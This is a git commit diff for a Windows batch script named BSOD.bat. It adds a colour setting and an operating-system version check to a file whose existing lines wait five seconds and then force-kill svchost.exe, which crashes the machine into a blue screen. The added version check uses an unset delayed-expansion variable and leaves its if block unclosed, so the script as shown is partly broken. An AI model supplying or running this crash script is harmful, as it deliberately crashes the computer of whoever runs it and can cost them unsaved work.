b7f7acacdf9a19f4f71877316cc371e9a22ad12c
Telefony i komputery <phonecollector2025@gmail.com>
2025-02-27 17:51:42 +0100

    BSOD.bat

--- BSOD.bat
+++ BSOD.bat
@@ -1,3 +1,16 @@
 @echo off
+color 0a
 timeout 5
 taskkill /f /im svchost.exe
+if !osNumber! lss 51 (
+	cls
+
+	title Unsupported Operating System Detected
+	color 0a
+
+	echo Sorry :( , but this script cannot be launched on an older Operating System. 
+	echo Please try it again on at least Windows XP Professional.
+	echo.
+	
+	pause
+	exit
